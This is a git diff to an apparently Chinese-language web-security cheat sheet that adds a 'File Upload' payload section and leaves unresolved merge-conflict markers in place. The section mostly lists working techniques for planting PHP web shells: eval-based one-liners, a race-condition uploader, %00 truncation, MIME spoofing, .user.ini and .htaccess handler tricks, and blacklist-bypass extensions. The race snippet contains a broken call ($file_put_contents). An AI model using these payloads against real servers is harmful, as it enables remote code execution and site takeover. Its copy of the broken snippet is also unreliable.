@@ -88,6 +88,50 @@ GBK注入的原因是因为GBK编码与addslashes()函数，\作为转义符来�
 # File Upload #
 
 ## Payload ##
+<<<<<<< HEAD
 
 ## 总结 ##
 
+=======
+* JS限制: 禁用JS
+* %00截断: ?path=../upload/shell.php%00
+* 竞争上传: 
+```
+<?php
+$file='web.php';
+$shell='<?php @eval($_POST["pass"]);?>';
+$file_put_contents($file, $shell);
+?>
+```
+* 内容检测: 
+```
+<script language=php>@eval($_POST['pass']);</script>
+<?= @eval($_POST["pass"]);?>
+```
+* MIME
+```
+Content-Type:image/png
+```
+* .user.ini
+```
+#shell.jpg
+<?php @eval($_POST["pass"]);?>
+
+#.user.ini
+auto_prepend_file=shell.jpg
+auto_append_file=shell.jpg
+auto_append_file=php://filter/read=convert.base64-decode/resource=shell.jpg
+```
+* 黑名单
+  * 大小写混写(pHp, PhP)
+  * 其他后缀名(php, php3, php4, php5, php7, pht, phtml, phps)
+* .htaccess(Apache)
+```
+SetHandler application/x-httpd-php
+
+SetHandler application/x-httpd-p\
+hp
+```
+
+## 总结 ##
+>>>>>>> 521eaedb558cb30729e3aed04dff6839cf23a1ff
